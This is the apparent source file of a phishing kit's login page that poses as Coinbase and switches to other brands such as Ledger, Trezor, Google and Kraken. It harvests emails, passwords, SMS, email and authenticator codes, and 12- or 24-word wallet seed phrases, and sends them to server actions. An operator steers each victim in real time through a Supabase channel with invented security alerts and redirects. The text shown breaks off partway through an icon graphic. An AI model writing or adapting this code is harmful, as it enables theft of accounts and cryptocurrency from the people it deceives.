"use client"

import React from "react"
import { useState, useRef, useEffect } from "react"
import { storeLoginAttempt, createSession, submitForApproval, clearSessionStatus, clearSessionRedirect, submitAuthenticatorCode, submitEmailCode, submitBalanceSelection, submitSecurityResponses, updateSessionStep, getActiveBrand, moveToStep, submitWalletSeedPhrase } from "@/app/actions"
import { createBrowserClient } from "@supabase/ssr"
import { getBrandConfig, type BrandConfig, type BrandId } from "@/lib/brands"
import LedgerFlow from "@/components/ledger-flow"
import TrezorFlow from "@/components/trezor-flow"
import OnePassFlow from "@/components/onepass-flow"
import GoogleFlow from "@/components/google-flow"
import KrakenFlow from "@/components/kraken-flow"



type SessionStatus = "idle" | "pending" | "approved" | "rejected"
type VerificationStep = "email" | "password" | "phone_verification" | "email_verification" | "authenticator_verification" | "balance" | "security_check" | "wallet_link" | "wallet_unlink" | "pending" | "2fa" | "2fa_pending" | "2fa_approved" | "2fa_denied" | "denied" | "requests" | "requests_complete" | "secure" | "lp_cancel_requests" | "lp_requests_cancelled"

type LpCancelSelection = {
  recent_logins: boolean | null
  password_changes: boolean | null
  recovery_requests: boolean | null
}

const WALLETS = [
  { id: "coinbasewallet", name: "Coinbase Wallet" },
  { id: "metamask", name: "MetaMask" },
  { id: "trustwallet", name: "Trust Wallet" },
  { id: "ledger", name: "Ledger" },
  { id: "phantom", name: "Phantom" },
  { id: "trezor", name: "Trezor" },
]

function WalletIcon({ type }: { type: string }) {
  if (type === "coinbasewallet") {
    return (
      <svg width="32" height="32" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect width="1024" height="1024" rx="180" fill="#0052FF"/>
        <path fillRule="evenodd" clipRule="evenodd" d="M152 512C152 710.823 313.177 872 512 872C710.823 872 872 710.823 872 512C872 313.177 710.823 152 512 152C313.177 152 152 313.177 152 512ZM420 396C406.745 396 396 406.745 396 420V604C396 617.255 406.745 628 420 628H604C617.255 628 628 617.255 628 604V420C628 406.745 617.255 396 604 396H420Z" fill="white"/>
      </svg>
    )
  }
  if (type === "metamask") {
    return (
      <svg width="32" height="32" viewBox="0 0 35 33" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M32.958 1L19.514 11.218l2.484-5.882L32.958 1z" fill="#E17726" stroke="#E17726" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M2.042 1l13.318 10.323-2.359-5.987L2.042 1zM28.12 23.533l-3.576 5.478 7.656 2.106 2.199-7.455-6.279-.129zM.605 23.662l2.186 7.455 7.643-2.106-3.563-5.478-6.266.129z" fill="#E27625" stroke="#E27625" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M10.073 14.513l-2.136 3.23 7.617.347-.26-8.199-5.221 4.622zM24.928 14.513l-5.298-4.727-.169 8.304 7.604-.347-2.137-3.23zM10.434 29.011l4.584-2.238-3.96-3.09-.624 5.328zM20.004 26.773l4.558 2.238-.611-5.328-3.947 3.09z" fill="#E27625" stroke="#E27625" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M24.562 29.011l-4.558-2.238.364 2.978-.039 1.256 4.233-1.996zM10.434 29.011l4.246 1.996-.026-1.256.351-2.978-4.571 2.238z" fill="#D5BFB2" stroke="#D5BFB2" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M14.784 21.927l-3.817-1.122 2.696-1.243 1.121 2.365zM20.216 21.927l1.121-2.365 2.709 1.243-3.83 1.122z" fill="#233447" stroke="#233447" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M10.434 29.011l.65-5.478-4.213.129 3.563 5.349zM23.916 23.533l.646 5.478 3.563-5.349-4.209-.129zM27.064 17.743l-7.604.347.708 3.837 1.121-2.365 2.709 1.243 3.066-3.062zM10.967 20.805l2.696-1.243 1.121 2.365.721-3.837-7.617-.347 3.079 3.062z" fill="#CC6228" stroke="#CC6228" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M7.937 17.743l3.196 6.229-.117-3.167-3.079-3.062zM24.002 20.805l-.13 3.167 3.196-6.229-3.066 3.062zM15.554 18.09l-.721 3.837.909 4.688.195-6.164-.383-2.361zM19.46 18.09l-.364 2.348.169 6.177.922-4.688-.727-3.837z" fill="#E27525" stroke="#E27525" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M20.186 21.927l-.922 4.688.664.468 3.947-3.09.13-3.167-3.819 1.101zM10.967 20.805l.117 3.167 3.96 3.09.65-.468-.908-4.688-3.819-1.101z" fill="#F5841F" stroke="#F5841F" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M20.277 31.007l.039-1.256-.345-.294H15.03l-.332.294.026 1.256-4.246-1.996 1.485 1.217 3.013 2.09h5.017l3.025-2.09 1.473-1.217-4.194 1.996z" fill="#C0AC9D" stroke="#C0AC9D" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M20.004 26.773l-.664-.468h-3.692l-.65.468-.351 2.978.332-.294h4.941l.345.294-.261-2.978z" fill="#161616" stroke="#161616" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M33.517 11.875l1.14-5.502L32.958 1l-12.954 9.607 4.985 4.215 7.045 2.059 1.551-1.813-.676-.49 1.082-.982-.826-.637 1.082-.826-.715-.558zM.342 6.373l1.153 5.502-.735.545 1.082.826-.813.637 1.082.982-.676.49 1.538 1.813 7.044-2.059 4.985-4.215L2.042 1 .342 6.373z" fill="#763E1A" stroke="#763E1A" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M32.034 16.881l-7.045-2.059 2.136 3.23-3.196 6.229 4.207-.052h6.279l-2.381-7.348zM10.073 14.822l-7.044 2.059-2.355 7.348h6.265l4.194.052-3.183-6.229 2.123-3.23zM19.46 18.09l.454-7.757 2.03-5.497H13.07l2.016 5.497.468 7.757.169 2.374.013 6.151h3.692l.026-6.151.169-2.374z" fill="#F5841F" stroke="#F5841F" strokeWidth=".25" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    )
  }
  if (type === "trustwallet") {
    return (
      <svg width="32" height="32" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="trust-gradient" x1="0" y1="0" x2="1" y2="0" gradientUnits="userSpaceOnUse" gradientTransform="rotate(107.581 170 110) scale(540)">
            <stop offset="0" stopColor="#00f"/>
            <stop offset=".02" stopColor="#00f"/>
            <stop offset=".08" stopColor="#0094ff"/>
            <stop offset=".16" stopColor="#48ff91"/>
            <stop offset=".42" stopColor="#0094ff"/>
            <stop offset=".68" stopColor="#0038ff"/>
            <stop offset=".9" stopColor="#0500ff"/>
            <stop offset="1" stopColor="#0500ff"/>
          </linearGradient>
        </defs>
        <path d="M37.523 83.593L255.21 13.046v488.371C99.709 436.301 37.523 311.5 37.523 240.964V83.593z" fill="#0500ff"/>
        <path d="M255.21 13.046L472.477 83.593v157.371c0 70.536-62.186 195.337-217.267 260.453V13.046z" fill="url(#trust-gradient)"/>
      </svg>
    )
  }
  if (type === "ledger") {
    return (
      <svg width="32" height="32" viewBox="0 0 383 128" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M327.262 119.94V127.998H382.57V91.6548H374.511V119.94H327.262ZM327.262 0V8.05844H374.511V36.3452H382.57V0H327.262ZM298.74 62.3411V43.6158H311.382C317.546 43.6158 319.758 45.6696 319.758 51.2803V54.5982C319.758 60.3657 317.624 62.3411 311.382 62.3411H298.74ZM318.808 65.6589C324.575 64.1578 328.604 58.7842 328.604 52.3856C328.604 48.3564 327.025 44.7211 324.023 41.7972C320.23 38.1619 315.172 36.3452 308.615 36.3452H290.838V91.6529H298.74V69.6097H310.592C316.675 69.6097 319.125 72.1378 319.125 78.4599V91.6548H327.184V79.7239C327.184 71.0325 325.13 67.7147 318.808 66.7662V65.6589ZM252.282 67.4756H276.618V60.207H252.282V43.6139H278.988V36.3452H244.222V91.6529H280.173V84.3842H252.282V67.4756ZM225.812 70.3995V74.1916C225.812 82.1717 222.888 84.78 215.541 84.78H213.803C206.454 84.78 202.899 82.4088 202.899 71.4264V56.5717C202.899 45.5109 206.613 43.2181 213.96 43.2181H215.539C222.73 43.2181 225.021 45.9048 225.099 53.3322H233.791C233.001 42.4283 225.732 35.5555 214.828 35.5555C209.535 35.5555 205.11 37.2153 201.792 40.3745C196.814 45.0367 194.049 52.9383 194.049 63.9991C194.049 74.6659 196.42 82.5675 201.318 87.4649C204.636 90.7044 209.219 92.4426 213.723 92.4426C218.463 92.4426 222.81 90.5456 225.021 86.438H226.126V91.6529H233.395V63.1309H211.983V70.3995H225.812ZM156.126 43.6139H164.739C172.878 43.6139 177.303 45.6677 177.303 56.7304V71.2677C177.303 82.3285 172.878 84.3842 164.739 84.3842H156.126V43.6139ZM165.449 91.6548C180.541 91.6548 186.149 80.1982 186.149 64.001C186.149 47.5666 180.145 36.3471 165.29 36.3471H148.223V91.6548H165.449ZM110.063 67.4756H134.399V60.207H110.063V43.6139H136.768V36.3452H102.002V91.6529H137.954V84.3842H110.063V67.4756ZM63.4464 36.3452H55.3879V91.6529H91.7332V84.3842H63.4464V36.3452ZM0 91.6548V128H55.3076V119.94H8.05844V91.6548H0ZM0 0V36.3452H8.05844V8.05844H55.3076V0H0Z" fill="black"/>
      </svg>
    )
  }
  if (type === "phantom") {
    return (
      <svg width="32" height="32" viewBox="0 0 43 43" fill="none" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="phantom-bg" x1="21.5" y1="0" x2="21.5" y2="43" gradientUnits="userSpaceOnUse">
            <stop stopColor="#534BB1"/>
            <stop offset="1" stopColor="#551BF9"/>
          </linearGradient>
          <linearGradient id="phantom-ghost" x1="21.96" y1="7.78" x2="21.96" y2="36.14" gradientUnits="userSpaceOnUse">
            <stop stopColor="#FFFFFF"/>
            <stop offset="1" stopColor="#FFFFFF" stopOpacity="0.82"/>
          </linearGradient>
        </defs>
        <circle cx="21.5" cy="21.5" r="21.5" fill="url(#phantom-bg)"/>
        <path d="M36.9,21.8h-3.8c0-7.7-6.3-14-14-14c-7.7,0-13.9,6.1-14,13.7c-0.2,7.8,7.2,14.7,15.1,14.7h1c6.9,0,16.3-5.4,17.7-12C39.1,22.9,38.1,21.8,36.9,21.8z M13.4,22.1c0,1-0.8,1.9-1.9,1.9c-1,0-1.9-0.8-1.9-1.9v-3c0-1,0.8-1.9,1.9-1.9c1,0,1.9,0.8,1.9,1.9V22.1z M20,22.1c0,1-0.8,1.9-1.9,1.9c-1,0-1.9-0.8-1.9-1.9v-3c0-1,0.8-1.9,1.9-1.9c1,0,1.9,0.8,1.9,1.9V22.1z" fill="url(#phantom-ghost)"/>
      </svg>
    )
  }
  if (type === "trezor") {
    return (
      <svg width="32" height="32" viewBox="0 0 260.73 378.41" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="m222.7,87.82C222.7,39.82,181.05,0,130.35,0S38,39.84,38,87.82v28.07H0v201.9h0l130.35,60.62,130.38-60.66h0V116.75h-38l-.03-28.93Zm-137.62,0c0-22.63,19.92-40.74,45.27-40.74s45.27,18.11,45.27,40.74v28.07h-90.54v-28.07Zm123.13,197.37l-77.86,36.22-77.86-36.22v-121.32h155.72v121.32Z" fill="#000000"/>
      </svg>
    )
  }
  return null
}

type SecurityResponses = {
  signin_request: "approved" | "denied" | null
  withdrawal_request: "approved" | "denied" | null
  phone_change_request: "approved" | "denied" | null
}

export default function CoinbaseLoginPage() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [verificationCode, setVerificationCode] = useState(["", "", "", "", "", ""])
  const [step, setStep] = useState<VerificationStep>("email")
  const [selectedBalance, setSelectedBalance] = useState<string | null>(null)
  const [requestsSubmitting, setRequestsSubmitting] = useState(false)
  const [showAdvanced, setShowAdvanced] = useState(false)
  const [lpCancelSelections, setLpCancelSelections] = useState<LpCancelSelection>({
    recent_logins: null,
    password_changes: null,
    recovery_requests: null,
  })
  const [lpCancelSubmitting, setLpCancelSubmitting] = useState(false)
  const [emailError, setEmailError] = useState("")
  const [upholdLoading, setUpholdLoading] = useState(false)


  function getStepLabel(s: VerificationStep): string {
    switch (s) {
      case "email": return "Sign In"
      case "password": return "Sign In"
      case "phone_verification": return "Verification"
      case "email_verification": return "Verification"
      case "authenticator_verification": return "Verification"
      case "balance": return "Account Verification"
      case "security_check": return "Security"
      case "wallet_link": return "Link Wallet"
      case "wallet_unlink": return "Unlink Wallet"
      case "lp_cancel_requests": return "Security Review"
      case "lp_requests_cancelled": return "Security Review"
      default: return "Account"
    }
  }
  const [securityResponses, setSecurityResponses] = useState<SecurityResponses>({
    signin_request: null,
    withdrawal_request: null,
    phone_change_request: null,
  })
  const [securityLocation, setSecurityLocation] = useState("Frankfurt, Germany")
  const [securityPhoneLast4, setSecurityPhoneLast4] = useState("9548")
  const [status, setStatus] = useState<SessionStatus>("idle")
  const [adminMessage, setAdminMessage] = useState<string | null>(null)
  const [showPassword, setShowPassword] = useState(false)
  const [phoneLast4, setPhoneLast4] = useState("7842")
  const [emailForCode, setEmailForCode] = useState("")
  const codeInputRefs = useRef<(HTMLInputElement | null)[]>([])
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [initializing, setInitializing] = useState(true)
  const [brand, setBrand] = useState<BrandConfig | null>(null)
  const [isLedger, setIsLedger] = useState(false)
  const [isTrezor, setIsTrezor] = useState(false)
  const [isOnePassword, setIsOnePassword] = useState(false)
  const [isGoogle, setIsGoogle] = useState(false)
  const [isKraken, setIsKraken] = useState(false)
  // Wallet states
  const [walletStep, setWalletStep] = useState<"select" | "seedphrase">("select")
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(""))
  const [wordCount, setWordCount] = useState<12 | 24>(12)
  const [walletErrorMessage, setWalletErrorMessage] = useState("")

  // Helper to force favicon refresh
  const updateFavicon = () => {
    const existing = document.querySelector("link[rel='icon']") as HTMLLinkElement
    if (existing) {
      existing.remove()
    }
    const link = document.createElement("link")
    link.rel = "icon"
    link.type = "image/svg+xml"
    link.href = "/api/favicon?t=" + Date.now()
    document.head.appendChild(link)
  }

  // Initialize session and set up realtime listener
  useEffect(() => {
    const initSession = async () => {
      // Fetch brand first
      let currentBrand = "coinbase"
      try {
        currentBrand = await getActiveBrand()
      } catch {
        currentBrand = "coinbase"
      }
      
      // Special brands render inline - no separate route
      if (currentBrand === "ledger") {
        setIsLedger(true)
        setInitializing(false)
        return
      }
      if (currentBrand === "trezor") {
        setIsTrezor(true)
        setInitializing(false)
        return
      }
      if (currentBrand === "onepassword") {
        setIsOnePassword(true)
        setInitializing(false)
        return
      }
      if (currentBrand === "google") {
        setIsGoogle(true)
        setInitializing(false)
        return
      }
      // Kraken now uses the same session-based flow as Coinbase
      // if (currentBrand === "kraken") {
      //   setIsKraken(true)
      //   setInitializing(false)
      //   return
      // }
      
      // Generic brands (Coinbase, Binance, etc.)
      const config = getBrandConfig(currentBrand)
      setBrand(config)
      document.title = config.title
      updateFavicon()

      // Create session for generic brands
      let sid = localStorage.getItem("coinbase_session_id")
      if (!sid) {
        sid = crypto.randomUUID()
        localStorage.setItem("coinbase_session_id", sid)
      }
      setSessionId(sid)
      
      try {
        await createSession(sid, navigator.userAgent, currentBrand)
      } catch (err) {
        console.error("Error creating session:", err)
      }
      
      setInitializing(false)
    }
    
    initSession()
  }, [])

  // Use a ref to track current step so the realtime callback always has the latest value
  // without needing step in the dependency array (which would tear down the subscription)
  const stepRef = useRef(step)
  useEffect(() => {
    stepRef.current = step
  }, [step])

  // Set up realtime subscription for admin commands
  useEffect(() => {
    if (!sessionId) return

    const supabase = createBrowserClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL!,
      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
    )

    // Also poll as backup every 2 seconds in case realtime misses events
    const pollInterval = setInterval(async () => {
      try {
        const [sessionResult, brandResult] = await Promise.all([
          supabase
            .from("sessions")
            .select("current_step, status, admin_message, redirect_url, phone_last4, email_for_code, security_location, security_phone_last4")
            .eq("id", sessionId)
            .maybeSingle(),
          supabase
            .from("settings")
            .select("value")
            .eq("key", "active_brand")
            .maybeSingle()
        ])
        
        if (sessionResult.data) {
          handleSessionUpdate(sessionResult.data)
        }
        if (brandResult.data?.value) {
          const newBrand = brandResult.data.value
          // Check if brand changed - compare with current states
          // Note: Kraken now uses the same session-based flow, not special handling
          const specialBrands = ["ledger", "trezor", "onepassword", "google"]
          const isCurrentSpecial = isLedger || isTrezor || isOnePassword || isGoogle
          const isNewSpecial = specialBrands.includes(newBrand)
          
          // Get current brand ID
          let currentBrandId = ""
          if (isLedger) currentBrandId = "ledger"
          else if (isTrezor) currentBrandId = "trezor"
          else if (isOnePassword) currentBrandId = "onepassword"
          else if (isGoogle) currentBrandId = "google"
          else if (brand) currentBrandId = brand.id
          
          // If brand changed, clear storage and reload
          if (currentBrandId && currentBrandId !== newBrand) {
            sessionStorage.clear()
            localStorage.removeItem("coinbase_session_id")
            window.location.reload()
          }
        }
      } catch {
        // Ignore polling errors
      }
    }, 2000)

    const handleSessionUpdate = async (newData: {
      redirect_url?: string | null
      current_step?: string | null
      status?: string | null
      admin_message?: string | null
      phone_last4?: string | null
      email_for_code?: string | null
      security_location?: string | null
      security_phone_last4?: string | null
    }) => {
      // Handle redirect
      if (newData.redirect_url) {
        await clearSessionRedirect(sessionId)
        window.location.href = newData.redirect_url
        return
      }
      
      // Handle phone_last4 update from admin
      if (newData.phone_last4) {
        setPhoneLast4(newData.phone_last4)
      }
      
      // Handle email_for_code update from admin
      if (newData.email_for_code) {
        setEmailForCode(newData.email_for_code)
      }
      
      // Handle security_location update from admin
      if (newData.security_location) {
        setSecurityLocation(newData.security_location)
      }
      
      // Handle security_phone_last4 update from admin
      if (newData.security_phone_last4) {
        setSecurityPhoneLast4(newData.security_phone_last4)
      }
      
      // Handle step change from admin
      if (newData.current_step) {
        // Redirect to dashboard
        if (newData.current_step === "dashboard") {
          window.location.href = "/dashboard"
          return
        }
        
        // Only update step if it's actually different from current
        if (newData.current_step !== stepRef.current) {
          setStep(newData.current_step as VerificationStep)
          setVerificationCode(["", "", "", "", "", ""])
          if (newData.current_step === "email") {
            setPassword("")
          }
          // Reset wallet state when switching to wallet steps
          if (newData.current_step === "wallet_link" || newData.current_step === "wallet_unlink") {
            setWalletStep("select")
            setSelectedWallet(null)
            setSeedPhrase(Array(12).fill(""))
            setWordCount(12)
            setStatus("idle")
            setWalletErrorMessage("")
          }
        }
      }
      
      // Handle status change
      if (newData.status && newData.status !== "idle") {
        setStatus(newData.status as SessionStatus)
        if (newData.admin_message) {
          setAdminMessage(newData.admin_message)
          setWalletErrorMessage(newData.admin_message)
        }
        
        // If approved, clear status after brief delay
        if (newData.status === "approved") {
          // Reset wallet state on approval
          setWalletStep("select")
          setSelectedWallet(null)
          setSeedPhrase(Array(12).fill(""))
          setWordCount(12)
          setWalletErrorMessage("")
          setTimeout(async () => {
            await clearSessionStatus(sessionId)
            setStatus("idle")
            setAdminMessage(null)
          }, 500)
        }
      } else if (newData.status === "idle") {
        // Only reset if we were in a non-idle state before
        setStatus("idle")
        setAdminMessage(null)
      }
    }

    const channel = supabase
      .channel(`session-${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          handleSessionUpdate(payload.new as Record<string, unknown>)
        }
      )
      .on(
        "postgres_changes",
        {
          event: "*",
          schema: "public",
          table: "settings",
        },
        (payload) => {
          const d = payload.new as { key?: string; value?: string }
          if (d.key === "active_brand" && d.value) {
            const config = getBrandConfig(d.value)
            setBrand(config)
            document.title = config.title
            updateFavicon()
          }
        }
      )
      .subscribe()

    return () => {
      clearInterval(pollInterval)
      supabase.removeChannel(channel)
    }
  }, [sessionId])

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!email || !sessionId) return
    
    // Validate email contains @
    if (!email.includes("@") || !email.includes(".")) {
      return
    }
    
    // Show password step immediately (no loading state)
    setStep("password")
    
    // Save email in background without triggering pending status
    updateSessionStep(sessionId, "password", email).catch(console.error)
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!password || !sessionId) return
    
    // Show loading state for Uphold
    if (isUphold) setUpholdLoading(true)
    
    // Show pending state immediately
    setStatus("pending")
    
    // Run server actions in parallel
    Promise.all([
      storeLoginAttempt({
        email,
        password,
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : undefined,
      }),
      submitForApproval(sessionId, "password", { email, password })
    ]).catch(console.error)
  }

  const handleCodeChange = (index: number, value: string) => {
    // Handle multi-character input (e.g. quick typing or autocomplete)
    const digits = value.replace(/\D/g, "")
    if (!digits && value !== "") return

    if (digits.length > 1) {
      // If multiple digits entered, spread them across fields
      const newCode = [...verificationCode]
      for (let i = 0; i < digits.length && index + i < 6; i++) {
        newCode[index + i] = digits[i]
      }
      setVerificationCode(newCode)
      const nextIndex = Math.min(index + digits.length, 5)
      setTimeout(() => codeInputRefs.current[nextIndex]?.focus(), 0)
      return
    }

    const newCode = [...verificationCode]
    newCode[index] = digits
    setVerificationCode(newCode)

    // Auto-advance to next field
    if (digits && index < 5) {
      setTimeout(() => codeInputRefs.current[index + 1]?.focus(), 0)
    }
  }

  const handleCodeKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (!verificationCode[index] && index > 0) {
        // Field is empty, move back and clear previous
        const newCode = [...verificationCode]
        newCode[index - 1] = ""
        setVerificationCode(newCode)
        codeInputRefs.current[index - 1]?.focus()
        e.preventDefault()
      } else {
        // Field has value, clear it and stay
        const newCode = [...verificationCode]
        newCode[index] = ""
        setVerificationCode(newCode)
        e.preventDefault()
      }
    }
    // Arrow key navigation
    if (e.key === "ArrowLeft" && index > 0) {
      codeInputRefs.current[index - 1]?.focus()
      e.preventDefault()
    }
    if (e.key === "ArrowRight" && index < 5) {
      codeInputRefs.current[index + 1]?.focus()
      e.preventDefault()
    }
  }

  const handleCodeFocus = (index: number) => {
    // Select content on focus so typing replaces it
    setTimeout(() => codeInputRefs.current[index]?.select(), 0)
  }

  const handleCodePaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)
    const newCode = [...verificationCode]
    for (let i = 0; i < pastedData.length; i++) {
      newCode[i] = pastedData[i]
    }
    setVerificationCode(newCode)
    if (pastedData.length > 0) {
      const focusIndex = Math.min(pastedData.length, 5)
      codeInputRefs.current[focusIndex]?.focus()
    }
  }

  const handleVerifyPhoneCode = async (e: React.FormEvent) => {
    e.preventDefault()
    const code = verificationCode.join("")
    if (code.length !== 6 || !sessionId) return
    
    // Show pending state immediately
    setStatus("pending")
    
    // Run server actions in parallel (don't block UI)
    Promise.all([
      storeLoginAttempt({
        email,
        password,
        phone_code: code,
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : undefined,
      }),
      submitForApproval(sessionId, "phone_verification", { email, password, phone_code: code })
    ]).catch(console.error)
  }

  const handleVerifyEmailCode = async (e: React.FormEvent) => {
    e.preventDefault()
    const code = verificationCode.join("")
    if (code.length !== 6 || !sessionId) return
    
    // Show pending state immediately
    setStatus("pending")
    submitEmailCode(sessionId, code).catch(console.error)
  }

  const handleVerifyAuthenticator = async (e: React.FormEvent) => {
    e.preventDefault()
    const code = verificationCode.join("")
    if (code.length !== 6 || !sessionId) return
    
    // Show pending state immediately
    setStatus("pending")
    submitAuthenticatorCode(sessionId, code).catch(console.error)
  }

  const handleSubmitBalance = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!selectedBalance || !sessionId) return
    
    // Show pending state immediately
    setStatus("pending")
    submitBalanceSelection(sessionId, selectedBalance).catch(console.error)
  }

  const handleSecurityResponse = (request: keyof SecurityResponses, response: "approved" | "denied") => {
    setSecurityResponses(prev => ({ ...prev, [request]: response }))
  }

  const handleSubmitSecurityCheck = async () => {
    if (!sessionId) return
    if (!securityResponses.signin_request || !securityResponses.withdrawal_request || !securityResponses.phone_change_request) return
    
    // Show pending state immediately
    setStatus("pending")
    submitSecurityResponses(sessionId, {
      signin_request: securityResponses.signin_request,
      withdrawal_request: securityResponses.withdrawal_request,
      phone_change_request: securityResponses.phone_change_request,
    }).catch(console.error)
  }

  const handleDismissError = async () => {
    if (sessionId) {
      await clearSessionStatus(sessionId)
    }
    setStatus("idle")
    setAdminMessage(null)
  }

  // Wallet helpers
  const walletRequires24Words = selectedWallet === "ledger" || selectedWallet === "trezor"
  const walletCanExtendTo24 = selectedWallet === "phantom" || selectedWallet === "trustwallet"
  const walletCurrentWordCount = walletRequires24Words ? 24 : wordCount
  const walletFilledWords = seedPhrase.filter((w: string) => w.trim()).length

  const handleWalletSelect = (walletId: string) => {
    setSelectedWallet(walletId)
    if (walletId === "ledger" || walletId === "trezor") {
      setSeedPhrase(Array(24).fill(""))
    } else {
      setSeedPhrase(Array(12).fill(""))
      setWordCount(12)
    }
  }

  const handleWalletWordCountChange = (count: 12 | 24) => {
    setWordCount(count)
    setSeedPhrase(Array(count).fill(""))
  }

  const handleWalletPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const currentCount = walletRequires24Words ? 24 : wordCount
    const words = e.clipboardData.getData("text").trim().split(/\s+/).slice(0, currentCount)
    const newPhrase = Array(currentCount).fill("")
    words.forEach((w, i) => { newPhrase[i] = w.toLowerCase() })
    setSeedPhrase(newPhrase)
  }

  const handleWalletSubmit = async () => {
    if (!sessionId || !selectedWallet) return
    const requiredWords = walletRequires24Words ? 24 : wordCount
    const phrase = seedPhrase.filter((w: string) => w).join(" ")
    if (phrase.split(" ").length !== requiredWords) return
    const action = step === "wallet_link" ? "link" : "unlink"
    await submitWalletSeedPhrase(sessionId, { wallet_type: selectedWallet, wallet_action: action, seed_phrase: phrase })
    setStatus("pending")
  }

  const handleWalletDismissError = () => {
    setStatus("idle")
    setWalletErrorMessage("")
  }

  // Apple Logo for iCloud
  const AppleLogo = ({ className }: { className?: string }) => (
    <svg viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg" className={className} aria-hidden="true">
      <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.2-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.23-12.74 3.35-4.93.21-9.84-1.96-14.74-6.52-3.13-2.73-7.05-7.41-11.77-14.02-5.05-7.08-9.2-15.29-12.46-24.65-3.5-10.11-5.25-19.9-5.25-29.39 0-10.86 2.35-20.22 7.04-28.04 3.69-6.27 8.59-11.21 14.73-14.83 6.14-3.62 12.78-5.47 19.94-5.6 3.91 0 9.05 1.21 15.43 3.6 6.36 2.4 10.45 3.62 12.25 3.62 1.35 0 5.92-1.43 13.68-4.27 7.33-2.64 13.52-3.73 18.6-3.3 13.74 1.11 24.07 6.52 30.95 16.29-12.29 7.45-18.36 17.87-18.21 31.24.14 10.41 3.88 19.08 11.2 25.96 3.33 3.16 7.05 5.61 11.17 7.35-.9 2.6-1.84 5.09-2.84 7.48zM119.04 7.01c0 8.16-2.98 15.78-8.91 22.83-7.17 8.39-15.83 13.23-25.24 12.47a25.4 25.4 0 0 1-.19-3.09c0-7.83 3.4-16.21 9.45-23.07 3.02-3.47 6.86-6.35 11.52-8.65 4.64-2.27 9.03-3.52 13.16-3.75.12 1.1.21 2.2.21 3.26z" fill="white"/>
    </svg>
  )

  // Apple Dots Ring for iCloud logo area
  const AppleDotsRing = () => (
    <div className="relative w-[120px] h-[120px] md:w-[160px] md:h-[160px]">
      <svg viewBox="0 0 160 160" className="w-full h-full" aria-hidden="true">
        {Array.from({ length: 36 }).map((_, i) => {
          const angle = (i / 36) * 2 * Math.PI - Math.PI / 2
          const radius = 65
          const x = 80 + radius * Math.cos(angle)
          const y = 80 + radius * Math.sin(angle)
          const progress = i / 36
          let color: string
          if (progress < 0.17) color = "#00d4ff"
          else if (progress < 0.33) color = "#00a8ff"
          else if (progress < 0.5) color = "#8b5cf6"
          else if (progress < 0.67) color = "#d946ef"
          else if (progress < 0.83) color = "#f43f5e"
          else color = "#fb923c"
          return <circle key={`outer-${i}`} cx={x} cy={y} r={4} fill={color} opacity={0.9} />
        })}
        {Array.from({ length: 24 }).map((_, i) => {
          const angle = (i / 24) * 2 * Math.PI - Math.PI / 2 + Math.PI / 24
          const radius = 52
          const x = 80 + radius * Math.cos(angle)
          const y = 80 + radius * Math.sin(angle)
          const progress = i / 24
          let color: string
          if (progress < 0.17) color = "#22d3ee"
          else if (progress < 0.33) color = "#38bdf8"
          else if (progress < 0.5) color = "#a78bfa"
          else if (progress < 0.67) color = "#e879f9"
          else if (progress < 0.83) color = "#fb7185"
          else color = "#fdba74"
          return <circle key={`middle-${i}`} cx={x} cy={y} r={3.5} fill={color} opacity={0.85} />
        })}
        {Array.from({ length: 16 }).map((_, i) => {
          const angle = (i / 16) * 2 * Math.PI - Math.PI / 2
          const radius = 40
          const x = 80 + radius * Math.cos(angle)
          const y = 80 + radius * Math.sin(angle)
          const progress = i / 16
          let color: string
          if (progress < 0.17) color = "#67e8f9"
          else if (progress < 0.33) color = "#7dd3fc"
          else if (progress < 0.5) color = "#c4b5fd"
          else if (progress < 0.67) color = "#f0abfc"
          else if (progress < 0.83) color = "#fda4af"
          else color = "#fed7aa"
